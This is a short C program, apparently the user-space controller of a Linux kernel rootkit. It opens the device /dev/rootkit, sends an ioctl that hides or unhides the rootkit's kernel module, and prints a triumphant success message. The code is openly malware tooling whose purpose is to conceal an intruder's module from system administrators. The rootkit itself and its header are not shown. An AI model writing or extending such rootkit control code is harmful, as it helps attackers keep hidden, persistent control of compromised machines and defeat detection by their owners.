#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include "../rootkit.h"



int main() {
    int fd = open("/dev/rootkit", O_RDWR);
    ioctl(fd, IOCTL_MOD_HIDE);
    printf("Yeah!!!!!!! Hide / Unhide operation successfully\n");
    close(fd);
    return 0;
}

